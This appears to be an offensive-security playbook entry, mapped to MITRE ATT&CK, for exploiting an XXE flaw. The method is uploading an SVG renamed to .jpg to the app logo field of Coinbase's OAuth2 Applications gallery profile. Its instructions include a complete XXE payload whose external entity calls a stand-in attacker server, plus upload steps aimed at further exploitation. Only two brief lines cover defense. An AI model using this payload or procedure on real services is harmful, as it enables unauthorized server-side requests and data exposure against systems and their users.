---
tags:
  - xxe
  - file-upload
  - svg
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 4e7fb812-c57b-4650-b038-73b86f1d8224
created_at: '2025-12-13T09:00:27.251Z'
updated_at: '2025-12-13T09:00:27.251Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Upload Malicious SVG for XXE

## Summary

This procedure involves creating and uploading a malicious SVG file containing an XXE payload, renamed to .jpg, to exploit an XXE vulnerability in the app logo upload feature of Coinbase's OAuth2 Applications gallery profile.

## Description

The procedure targets improper XML parsing in the upload functionality, allowing external entity resolution. It is used in scenarios where file uploads are processed as XML, enabling initial access for further exploitation like forcing external connections.

## Requirements

1. Access to the Coinbase OAuth2 Applications gallery profile upload feature
2. Ability to create and rename files (e.g., SVG to .jpg)
3. Network access to upload files

## Defense

Defensive measures and detection strategies:

- Implement strict XML parsing with external entity resolution disabled
- Validate file types and contents before processing

## Objectives

1. Upload the malicious file to trigger XXE
2. Confirm successful upload
3. Prepare for payload execution in subsequent steps

## Instructions

### Step 1: Create Malicious SVG File

**Context**: Craft an SVG file with embedded XML payload referencing an external entity.

> Create a file (e.g., malicious.svg) with content like: <?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://attacker-server/">]><svg>&xxe;</svg>. Rename to malicious.jpg.

### Step 2: Upload the File

**Context**: Upload the renamed file to the app logo section.

> Navigate to the OAuth2 Applications gallery profile and select the file for upload.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- [[xxe]]
- [[file-upload]]
